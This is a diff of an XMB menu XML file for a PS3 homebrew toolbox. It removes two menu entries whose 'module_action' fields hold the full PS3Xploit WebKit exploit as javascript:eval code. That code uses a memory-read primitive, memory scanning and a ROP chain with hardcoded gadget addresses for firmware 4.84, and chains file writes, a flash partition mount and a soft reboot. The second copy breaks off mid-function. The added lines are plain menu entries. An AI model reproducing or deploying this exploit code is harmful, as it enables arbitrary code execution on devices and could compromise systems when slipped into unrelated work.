@@ -3,14 +3,49 @@
 <!-- Main Items > Advanced Tools (CEX mode) -->
 		
 	<View id="han_advanced_menu_main">
-		<Attributes>			
-			<Table key="han_database_rebuilder_offline">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/rebuild.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_database_rebuilder</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_database_rebuilder_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,default_vsh_pub_toc=7263652,vsh_opd_patch=617820,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry1_addr=7185360,toc_entry2_addr=7494200,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255744,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332484,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380604,gadget7_addr=131024,gadget8_addr=131072,soft_reboot=0x200,sc_sm_shutdown=0x17B,gadget12_addr=0x0C864C,sc_fs_open=0x321,gadget_mod4b_addr=0x42C778,fs_flag_create=0x241,fs_mode=0x1B6,sc_fs_write=0x323,sc_fs_close=0x324,gadget_mod1_addr=6352696,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,hr="\74hr\76",path_db_rebuild="/dev_hdd0/mms/db.err",db_rebuild_bytes=0x000003E9,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple"));document.write(\47\74html\76\74head\76\74title\76PS3Xploit - Offline Database Rebuilder by lmn7\74/title\76\74/head\76\74body id="bodyId" style="background-color:#FFFFFF"\76\74div id="headerId"\76\74h1\76Rebuilding database...\74/h1\76\74span id="hideme" style="visibility:hidden"\76\74p\76\74button id="btnROP" type="button" onclick="initROP(true);" autofocus\76Initialize\74/button\76 | Close \74input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\76\74span id="dex_txt" style="visibility:hidden"\76\74input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\76\74/span\76\74/p\76\74p\76\74button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\76En\74/button\76\74span id="reset" style="visibility:hidden"\76 | \74button id="btnReset" type="button" onclick="disable_trigger();"\76Reset\74/button\76\74/span\76\74/p\76\74/span\76\74div id="exploit" \76\74/div\76\74div id="trigger"\76\74/div\76\74/body\76\74/html\76\47);if(fwv=="4.84"){var toc_addr=7296344,default_vsh_pub_toc=7263660,vsh_opd_patch=617820,vsh_opd_addr=7256944,vsh_toc_addr_screenshot=7472764,vsh_ps3xploit_key_toc=7370860,toc_entry1_addr=7185360,toc_entry2_addr=7494456,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255752,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332644,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380764,gadget7_addr=131024,gadget8_addr=131072,gadget9_addr=170760,gadget10_addr=6479908,gadget11_addr=5874864,gadget12_addr=820812,gadget13_addr=4777384,gadget14_addr=4769696,gadget15_addr=4758664,gadget_mod1_addr=6352856,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod4b_addr=4376440,gadget_mod4c_addr=346864,gadget_mod5_addr=4339932,gadget_mod6_addr=134144,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,gadget_mod9_addr=68384,gadget_mod10_addr=1857428,gadget_mod11_addr=1618244,gadget_mod12_addr=6500860,gadget_mod13_addr=3369072,gadget_mod14_addr=6502656,gadget_mod15_addr=3788856,gadget_mod16_addr=5206828}function syscall_r3_p2p(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function save_file_overwrite(a,b,c,d,e,f){return syscall(sc_fs_open,a,fs_flag_create,b,fs_mode,f,0,0,0)+syscall_r3_p2p(sc_fs_write,b,c,e,d,0,0,0,0,0,0)+syscall_r3_p2p(sc_fs_close,b,0,0,0,0,0,0,0,0,0)}function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\76\7616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\470000\47+this).substr(-4)};String.prototype.toAscii=function(a){var b=\47\47;var i=0;while(i\74this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\741){return\47\47}var b=\47\47;var c=\47\47;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}while(i\74b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\47\47)};String.prototype.convertedSize=function(a){if(this.length\741){return 0}var b=\47\47;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\47\47,sign=this\740?\47-\47:\47\47,str=a[0].replace(\47.\47,\47\47),mag=Number(a[1])+1;if(mag\740){z=sign+\470.\47;while(mag++){z+=\470\47}return z+str.replace(/^\-/,\47\47)}mag-=str.length;while(mag--){z+=\470\47}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\76\761}}g.reverse();var k=g.join(\47\47);var l=(1\74\74(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\74\74b)-1){d=f!==0?NaN:s*Infinity}else if(e\760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\76\7624)&0xFF,(a\76\7616)&0xFF,(a\76\768)&0xFF,(a)&0xFF,(b\76\7624)&0xFF,(b\76\7616)&0xFF,(b\76\768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\74\7432)|((b\76\761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\47exploit\47)){document.getElementById(\47exploit\47).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\47exploit\47)){readMemory(a,b);if(debug===true){var x=document.getElementById(\47exploit\47).style.src.substr(6,c);return x}return document.getElementById(\47exploit\47).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\47trigger\47)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\47auto_close\47);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\74max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\47exploit\47).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\74(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\74(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\74offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+path_db_rebuild.convert()+hexw2bin(db_rebuild_bytes)+fill_by_16bytes(0x10,dbyte00)+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\74search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}path_db_rebuild_addr=xtra_data_addr+0x2;db_rebuild_bytes_addr=path_db_rebuild_addr+path_db_rebuild.convertedSize();size_validate_addr=db_rebuild_bytes_addr+0x4;stack_frame=stack_frame_hookup()+save_file_overwrite(path_db_rebuild_addr,gtemp_addr-0x1000,db_rebuild_bytes_addr,gtemp_addr-0x5000,0x4,gtemp_addr-0x8000)+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,soft_reboot,0,0,0,0,0,0,0)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\74search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\74search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\74search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\74search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\74search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
+		<Attributes>
+			<Table key="han_file_operations">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/folder.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_file_operations</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_file_operations_info</String></Pair>
 			</Table>
+			<Table key="han_system_operations">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/folder.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_system_operations</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_system_operations_info</String></Pair>
+			</Table>
+			<Table key="han_dex_settings_injector">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/folder.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_dex_xmb_setup</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_dex_xmb_setup_info</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>			
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="han_file_operations"
+				attr="han_file_operations" 				
+				src="#han_file_operations_items"
+				/>
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="han_system_operations"
+				attr="han_system_operations" 				
+				src="#han_system_operations_items"
+				/>
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="han_dex_settings_injector"
+				attr="han_dex_settings_injector" 				
+				src="#han_dex_settings_injector_items"
+				/>
+		</Items>
+	</View>
+
+<!-- Main Items > Advanced Tools > File Operations (CEX mode) -->
+		
+	<View id="han_file_operations_items">
+		<Attributes>
 			<Table key="han_file_copier_offline">
 				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/copy_file.png</String></Pair>
 				<Pair key="title_rsc"><String>han_toolbox_file_copier</String></Pair>
@@ -28,32 +63,8 @@
 				<Pair key="title_rsc"><String>han_toolbox_file_injector</String></Pair>
 				<Pair key="info_rsc"><String>han_toolbox_file_injector_info</String></Pair>
 			</Table>
-			<Table key="han_flash_mounter_offline">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/net_eject.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_flash_mounter</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_flash_mounter_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,default_vsh_pub_toc=7263652,vsh_opd_patch=617820,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry1_addr=7185360,toc_entry2_addr=7494200,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255744,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332484,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380604,gadget7_addr=131024,gadget8_addr=131072,gadget_mod1_addr=6352696,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,hr="\74hr\76",gadget12_addr=0x0C864C,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),flash_partition1="xxxxCELL_FS_IOS:BUILTIN_FLSH1",filesystem_fat="CELL_FS_FAT",mount_path_blind="/dev_blind";document.write(\47\74html\76\74head\76\74title\76PS3Xploit - Flash Mounter\74/title\76\74/head\76\74body id="bodyId" style="background-color:#FFFFFF"\76\74div id="headerId"\76\74h1\76Mounting dev_flash to dev_blind...\74/h1\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76\74/body\76\74/html\76\47);if(fwv=="4.84"){var toc_addr=7296344,default_vsh_pub_toc=7263660,vsh_opd_patch=617820,vsh_opd_addr=7256944,vsh_toc_addr_screenshot=7472764,vsh_ps3xploit_key_toc=7370860,toc_entry1_addr=7185360,toc_entry2_addr=7494456,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255752,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332644,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380764,gadget7_addr=131024,gadget8_addr=131072,gadget9_addr=170760,gadget10_addr=6479908,gadget11_addr=5874864,gadget12_addr=820812,gadget13_addr=4777384,gadget14_addr=4769696,gadget15_addr=4758664,gadget_mod1_addr=6352856,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod4b_addr=4376440,gadget_mod4c_addr=346864,gadget_mod5_addr=4339932,gadget_mod6_addr=134144,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,gadget_mod9_addr=68384,gadget_mod10_addr=1857428,gadget_mod11_addr=1618244,gadget_mod12_addr=6500860,gadget_mod13_addr=3369072,gadget_mod14_addr=6502656,gadget_mod15_addr=3788856,gadget_mod16_addr=5206828}function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\76\7616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\470000\47+this).substr(-4)};String.prototype.toAscii=function(a){var b=\47\47;var i=0;while(i\74this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\741){return\47\47}var b=\47\47;var c=\47\47;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}while(i\74b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\47\47)};String.prototype.convertedSize=function(a){if(this.length\741){return 0}var b=\47\47;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\47\47,sign=this\740?\47-\47:\47\47,str=a[0].replace(\47.\47,\47\47),mag=Number(a[1])+1;if(mag\740){z=sign+\470.\47;while(mag++){z+=\470\47}return z+str.replace(/^\-/,\47\47)}mag-=str.length;while(mag--){z+=\470\47}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\76\761}}g.reverse();var k=g.join(\47\47);var l=(1\74\74(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\74\74b)-1){d=f!==0?NaN:s*Infinity}else if(e\760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\76\7624)&0xFF,(a\76\7616)&0xFF,(a\76\768)&0xFF,(a)&0xFF,(b\76\7624)&0xFF,(b\76\7616)&0xFF,(b\76\768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\74\7432)|((b\76\761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\47exploit\47)){document.getElementById(\47exploit\47).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\47exploit\47)){readMemory(a,b);if(debug===true){var x=document.getElementById(\47exploit\47).style.src.substr(6,c);return x}return document.getElementById(\47exploit\47).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\47trigger\47)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){window.close()}function load_check(){if(total_loops\74max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\47exploit\47).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\74(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\74(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\74offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function 